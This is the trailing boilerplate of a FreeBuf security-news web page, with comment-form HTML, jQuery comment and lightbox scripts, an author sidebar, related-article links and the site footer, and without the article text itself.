src="http://image.3001.net/images/index/smilies/icon_twisted.gif" /></a><a title="roll" href="javascript:grin(':roll:')"><img src="http://image.3001.net/images/index/smilies/icon_rolleyes.gif" /></a><a title="wink" href="javascript:grin(':wink:')"><img src="http://image.3001.net/images/index/smilies/icon_wink.gif" /></a><a title="idea" href="javascript:grin(':idea:')"><img src="http://image.3001.net/images/index/smilies/icon_idea.gif" /></a><a title="arrow" href="javascript:grin(':arrow:')"><img src="http://image.3001.net/images/index/smilies/icon_arrow.gif" /></a><a title="neutral" href="javascript:grin(':neutral:')"><img src="http://image.3001.net/images/index/smilies/icon_neutral.gif" /></a><a title="cry" href="javascript:grin(':cry:')"><img src="http://image.3001.net/images/index/smilies/icon_cry.gif" /></a><a title="?" href="javascript:grin(':?:')"><img src="http://image.3001.net/images/index/smilies/icon_question.gif" /></a><a title="evil" href="javascript:grin(':evil:')"><img src="http://image.3001.net/images/index/smilies/icon_evil.gif" /></a><a title="shock" href="javascript:grin(':shock:')"><img src="http://image.3001.net/images/index/smilies/icon_eek.gif" /></a><a title="!" href="javascript:grin(':!:')"><img src="http://image.3001.net/images/index/smilies/icon_exclaim.gif" /></a>        </div>
         <textarea name="comment" id="comment" cols="100%" rows="7" tabindex="4" style="overflow-x:hidden; overflow-y:hidden; border:0; width:100%;" onkeydown="if(event.ctrlKey&amp;&amp;event.keyCode==13){document.getElementById('submit').click();return false};"></textarea>
    </div>
      <div class="subcon but">
      <input class="btn btn-success" type="submit" name="submit" id="submit" tabindex="5" value="提交评论(Ctrl+Enter)" />
      <a rel="nofollow" class="btn btn-default" id="cancel-comment-reply-link" href="javascript:;">取消</a>
      <div class="checkbox"><input type='hidden' name='comment_post_ID' value='59045' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<label for="comment_mail_notify" class="comment_mail"><input type="checkbox" name="comment_mail_notify" id="comment_mail_notify" value="comment_mail_notify" checked="checked"/>有人回复时邮件通知我</label></div>
      </div>
    <input name="Token" id="Token" type="hidden" value="slwamz" />
  </form>
  </div>
</div>	  
<div class="commentshow">
<div class="comments-loading">Loading...</div>
</div>
<script language="javascript">
jQuery(document).ready(function($){ //Begin jQuery
    $('.reply').click(function() {
    var atid = '"#' + $(this).parent().attr("id") + '"';
    var atname = $(this).parent().find('span:first').text();
    $("#comment").val("@" + atname + " ").focus();
});
    $('.cancel-comment-reply a').click(function() { //点击取消回复评论清空评论框的内容
    $("#comment").val('');
});
}) 

jQuery(document).ready(function($) {
    $body = (window.opera) ? (document.compatMode == "CSS1Compat" ? $('html') : $('body')) : $('html,body');//commentnav ajax
    $(document).on('click', '.commentnav a', function(e) {
        e.preventDefault();
        $.ajax({
            type: "GET",
            url: $(this).attr('href'),
            beforeSend: function() {
                $('.commentnav').remove();
                $('.comment-list').remove();
                $('.comments-loading').slideDown();
            },
            dataType: "html",
            success: function(out) {
                result = $(out).find('.comment-list');
                nextlink = $(out).find('.commentnav');
                $('.comments-loading').slideUp(550);
                $('.comments-loading').after(result.fadeIn(800));
                $(".comment-list img").each(function(){
                  var url = $(this).attr("data-original");
                  $(this).attr("src",url);
                })
            }
        });
    });    
});
</script>            </div>
                    <div class="col-md-3 visible-md-block visible-lg-block">
                <div class="panel panel-default">
                    <div class="author-top">
                         <div class="author-wrap">
                            <div class="author-header"><img src="http://image.3001.net/2016/02/img-deb2308e581acc70843c632c719a2b47_1.jpg" width="100" height="93" alt="banish" class="avatar avatar-100 wp-user-avatar wp-user-avatar-100 photo" />                            </div>
                            <p class="name"><a href="http://www.freebuf.com/author/banish" title="由 banish 发布" rel="author">banish</a><span></span></p>
                            <p class="signature">天地不仁 万物刍狗</p>
                            <p class="art-com clearfix">
                                <span class="aut-article">
                                    <a href="/author/banish"target="_blank">
                                        <i>32</i>
                                        <i>文章数</i>
                                    </a>
                                </span>
                                <span class="aut-comment">
                                    <a href="/author/banish?comment=1" target="_blank">
                                        <i>53</i>
                                        <i>评论数</i>
                                    </a>
                                </span>
                            </p>
                        </div>
                    </div>
                    <div class="author-bottom">
                        <div class="author-wrap">
                            <h3 class="last-title">最近文章</h3>
                            <div class="last-item-wrap">
                                                                        <div class="last-item">
                                            <a href="http://www.freebuf.com/news/112036.html" target="_blank"><span class="point"></span>组合漏洞或可远程重置全系列三星手机</a>
                                            <p class="last-time">2016.08.17</p>
                                        </div>
                                                                            <div class="last-item">
                                            <a href="http://www.freebuf.com/vuls/110110.html" target="_blank"><span class="point"></span>我是如何黑进成人生活网站Pornhub拿到2万美元赏金的</a>
                                            <p class="last-time">2016.07.27</p>
                                        </div>
                                                                            <div class="last-item">
                                            <a href="http://www.freebuf.com/news/109927.html" target="_blank"><span class="point"></span>斯诺登发明了一种检测和阻拦无线监听的iPhone外壳</a>
                                            <p class="last-time">2016.07.25</p>
                                        </div>
                                                                </div>
                        </div>

                        <div class="more-wrap">
                            <a href="http://www.freebuf.com/author/banish" target="_blank" class="btn-new">浏览更多</a>
                        </div>
                    </div>
                </div>
                                <div class="panel panel-default">
                    <div class="read visible-md-block visible-lg-block">
                        <div class="main-tit02">
                            <h3>相关阅读</h3>
                        </div>
                        <ul>
  <li><a href="http://www.freebuf.com/articles/terminal/131193.html" target="_blank">基于ArduinoLeonardo板子的BadUSB攻击实战</a></li>
  
  <li><a href="http://www.freebuf.com/geek/91814.html" target="_blank">极客DIY：使用Arduino制作一块开源手表</a></li>
  
  <li><a href="http://www.freebuf.com/news/66803.html" target="_blank">运行于显卡（GPU）的Rootkit木马和键盘记录器问世</a></li>
  
  <li><a href="http://www.freebuf.com/geek/101222.html" target="_blank">极客DIY：利用Arduino 制作一个小机器人</a></li>
  
  <li><a href="http://www.freebuf.com/sectool/59045.html" target="_blank">间谍游戏：用Arduino制作硬件键盘记录器</a></li>
  </ul>                    </div>
                </div>
                <!--<div class="ad-wrap"><a href="http://www.ijiami.cn/?freebuf.com" target="_blank"><img width="100%" src="http://image.3001.net/images/20141201/14174039186901.jpg"></a></div>-->
                <div class="panel panel-default rec-spe">
                    <div class="main-tit03 colour-blue">
                        <h3>特别推荐</h3>
                    </div>
                                                    <div class="rec-img"><a href="http://www.freebuf.com/ad?id=3" target="_blank"><img
                                            src="http://image.3001.net/2017/05/14a10c5c919d154dddbee79e3a944143-220x150.png" width="220"></a></div>
                                                </div>
                <div id="mar-right">
                    <!--<div class="read visible-lg-block">
        <div class="main-tit04">
          <h3>商城新品</h3>
        </div>
        <div id="slider" class="nivoSlider">  </div>
      </div>-->
                    <div class="panel panel-default code"><img src="http://image.3001.net/images/new/code.jpg" width="192"
                                                               height="192">
                        <p>关注我们 分享每日精选文章</p>
                    </div>
                </div>
            </div>
                </div>
                    <div class="row marvellous visible-lg-block">
                <h3>不容错过</h3>
                <ul>
                                                <li><a href="http://www.freebuf.com/video/108169.html" rel="bookmark"
                                   title="一周「BUF大事件」（20160625-20160701）">一周「BUF大事件」（20160625-20160701）</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/supercoco" title="由 supercoco 发布" rel="author">supercoco</a></span>
                                                                        <span class="time">2016-07-02</span></p>
                            </li>
                                                    <li><a href="http://www.freebuf.com/articles/web/133306.html" rel="bookmark"
                                   title="游戏外挂网站暗藏病毒：盗号、锁首等数种危害并举">游戏外挂网站暗藏病毒：盗号、锁首等数种危害并举</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/%e7%81%ab%e7%bb%92%e5%ae%89%e5%85%a8" title="由 火绒安全 发布" rel="author">火绒安全</a></span>
                                                                        <span class="time">2017-05-02</span></p>
                            </li>
                                                    <li><a href="http://www.freebuf.com/news/145583.html" rel="bookmark"
                                   title="CIA 对本国情报机构下手？利用ExpressLane工具搜集FBI与NSA等机构的数据">CIA 对本国情报机构下手？利用ExpressLane工具搜集FBI与NSA等机构的数据</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/angelay" title="由 AngelaY 发布" rel="author">AngelaY</a></span>
                                                                        <span class="time">2017-08-25</span></p>
                            </li>
                                                    <li><a href="http://www.freebuf.com/news/120128.html" rel="bookmark"
                                   title="WiFi信号干扰可以泄漏你的密码和敏感信息">WiFi信号干扰可以泄漏你的密码和敏感信息</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/%e7%b1%b3%e9%9b%aa%e5%84%bf" title="由 米雪儿 发布" rel="author">米雪儿</a></span>
                                                                        <span class="time">2016-12-02</span></p>
                            </li>
                                                            </ul>
            </div>
            </div>
</div>
<script type="text/javascript">
  $(window).load(function() {
    $('#slider').nivoSlider();
  });
  $('#contenttxt img').removeAttr('height');
  $('#contenttxt img').wrap(function(){
    if(!$(this).parent().attr('href')){
      var imgurl = $(this).attr('data-original');
      if(imgurl.substr(-6)=='!small'){
        imgurl = imgurl.substring(0,imgurl.length-6);
      }
      return '<a href="' + imgurl + '" class="highslide-image" onclick="return hs.expand(this);" target="_blank"></a>';
    }
  })
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/comments-ajax.js" type="text/javascript"></script>
<script type="text/javascript" src="http://static.3001.net/js/focus/jquery.nivo.slider.pack.js"></script>
<!----------footer---------->
<div class="footer">
  <div class="container">
    <div class="footer-list ">
      <h3>FREEBUF</h3>
      <ul>
        <li><a href="http://www.freebuf.com/dis">免责声明</a></li>
        <li><a href="http://www.freebuf.com/news/others/864.html">关于我们</a></li>
        <li><a href="http://www.freebuf.com/jobs/40386.html">加入我们</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>广告及服务</h3>
      <ul>
        <li><a target="_blank" href="mailto:root@freebuf.com">寻求报道</a></li>
        <li><a href="http://www.freebuf.com/advertise">广告合作</a></li>
        <li><a target="_blank" href="mailto:help@freebuf.com">联系我们</a></li>
        <li><a href="http://www.freebuf.com/friends">友情链接</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>关注我们</h3>
      <ul>
        <li><div class="weixin-pannel weixin"><a class="qr" href="javascript:viod(0);"><span class="g-icon-qr1">官方微信</span><i></i></a></div></li>
        <li><a rel="nofollow" target="_blank" href="http://weibo.com/freebuf">新浪微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://t.qq.com/freebuf">腾讯微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://twitter.com/freebuf">Twitter</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>赞助商</h3>
      <ul>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="http://www.aliyun.com/?freebuf"><img src="http://image.3001.net/images/ad/ali.png"></a></li>
        <li><a rel="nofollow" target="_blank" href="http://www.upyun.com/?freebuf"><img src="http://image.3001.net/images/ad/upyun.png"></a></li>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="https://www.trustasia.com/?freebuf"><img src="http://image.3001.net/images/ad/ad-yzcx.png"></a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <ul>
      </ul>
    </div>
    <div class="footer-logo  pull-right"><img src="http://image.3001.net/images/index/freebufrobot_shendanjie.png" ></div>
  </div>
  <div class="copyright"><div class="container"><p>Copyright &copy; 2017 WWW.FREEBUF.COM All Rights Reserved <a rel="nofollow" target="_blank" href="http://www.miitbeian.gov.cn">沪ICP备13033796号</a></p><span><a rel="nofollow" target="_blank" href="http://click.aliyun.com/m/1336/?freebuf"><img src="http://image.3001.net/images/new/icon-aly.png"></a></span></div></div>
</div>
<div class="bottom_tools"><a id="scrollUp" href="javascript:;" title="飞回顶部"></a></div>
<!----------footer end----------> 
<script src="http://static.3001.net/js/new/backtop.js"></script>
<script type="text/javascript">
jQuery(function(){	
	jQuery('.tabPanes ul li').click(function(){
		jQuery(this).addClass('hit').siblings().removeClass('hit');
		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
	})
	jQuery('.vulbox-nav').click(function(e) { 
        e.stopPropagation(); 
    });  
})
</script>
<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
</script>
<img alt='css.php' src="http://www.freebuf.com/buf/plugins/cc/css.php?k=3cb185a485c81b23211eb80b75a406fd&amp;o=i&amp;t=1707871119" width='1' height='1' /><script type="text/javascript">
jQuery(function() {
    jQuery(".simditor pre").each(function(i, block){
        hljs.highlightBlock(block);    
    });
    hljs.initHighlightingOnLoad();
});
</script>
<script>
/* <![CDATA[ */
var rcGlobal = {
	serverUrl		:'http://www.freebuf.com',
	infoTemp		:'%REVIEWER% on %POST%',
	loadingText		:'Loading',
	noCommentsText	:'No comments',
	newestText		:'&laquo; 最新',
	newerText		:'&laquo; 新一点',
	olderText		:'旧一点 &raquo;',
	showContent		:'1',
	external		:'1',
	avatarSize		:'32',
	avatarPosition	:'left',
	anonymous		:'Anonymous'
};
/* ]]> */
</script>
<script type='text/javascript' src='http://static.3001.net/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3'></script>
</body>
</html>
